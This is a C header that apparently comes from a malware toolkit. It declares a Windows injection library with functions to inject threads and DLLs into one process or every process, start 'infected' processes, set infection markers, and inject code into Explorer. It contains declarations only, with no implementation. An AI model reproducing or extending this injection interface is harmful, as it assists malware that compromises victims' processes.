#ifndef SYSLIB_INJECT_H_INCLUDED
#define SYSLIB_INJECT_H_INCLUDED

#include "syslib_exp.h"

SYSLIBEXP(BOOL) IsProcessInfected(DWORD dwPID);
SYSLIBEXP(BOOL) IsWindowInfected(HWND hWnd);
SYSLIBEXP(HANDLE) MarkProcessAsInfected(DWORD dwPID);
SYSLIBEXP(BOOL) InjectWnd(LPTHREAD_START_ROUTINE lpFunction,HWND hWnd,LPVOID lpParam);
SYSLIBEXP(BOOL) InjectProc(LPTHREAD_START_ROUTINE lpFunction,DWORD dwPID,LPVOID lpParam);
SYSLIBEXP(BOOL) InjectNewProc(LPTHREAD_START_ROUTINE lpFunction,HANDLE hProc,HANDLE hThread,LPVOID lpParam);
SYSLIBEXP(void) InjectProcToAll(LPTHREAD_START_ROUTINE lpFunction,LPVOID lpParam);
SYSLIBEXP(void) DestroyInject();

SYSLIBEXP(LPVOID) PreparePlaceForOurDll(HANDLE hProc,LPBYTE lpDll,LPVOID *lppBaseAddr);
SYSLIBEXP(BOOL) InjectDll(DWORD dwPID,LPBYTE lpDll);

SYSLIBEXP(DWORD64) PreparePlaceForOurDll64(HANDLE hProc,LPBYTE lpDll,DWORD64 *lppBaseAddr);
SYSLIBEXP(BOOL) InjectDll64(DWORD dwPID,LPBYTE lpDll64);

SYSLIBEXP(void) InjectDllToAll(LPBYTE lpDll);
SYSLIBEXP(void) InjectDll64ToAll(LPBYTE lpDll64);

SYSLIBEXP(DWORD) StartInfectedProcessW(LPWSTR lpFileName,LPTHREAD_START_ROUTINE lpAddr,LPVOID lpParam,int dwWaitTimeout);
SYSLIBEXP(DWORD) StartInfectedProcessA(LPSTR lpFileName,LPTHREAD_START_ROUTINE lpAddr,LPVOID lpParam,int dwWaitTimeout);

#ifdef UNICODE
#define StartInfectedProcess StartInfectedProcessW
#else
#define StartInfectedProcess StartInfectedProcessA
#endif


SYSLIBEXP(void) SetInfectionMarkerW(LPCWSTR lpMarker);
SYSLIBEXP(void) SetInfectionMarkerA(LPCSTR lpMarker);

#ifdef UNICODE
#define SetInfectionMarker SetInfectionMarkerW
#else
#define SetInfectionMarker SetInfectionMarkerA
#endif


#ifdef _X86_
SYSLIBEXP(BOOL) InjectOurShitToExplorer64Param(LPBYTE lpDll64,LPBYTE lpParam,DWORD dwParamSize);
#define InjectOurShitToExplorer64(lpDll64) InjectOurShitToExplorer64Param(lpDll64,NULL,0)
#endif

SYSLIBEXP(BOOL) InjectOurShitToExplorerParam(LPBYTE lpDll32,LPBYTE lpParam,DWORD dwParamSize);
#define InjectOurShitToExplorer(lpDll) InjectOurShitToExplorerParam(lpDll,NULL,0)

SYSLIBEXP(void) ExplorerInj_Init(LPVOID lpInternalStruct,LPVOID *lppParameter,LPDWORD lpSize);

#endif // SYSLIB_INJECT_H_INCLUDED
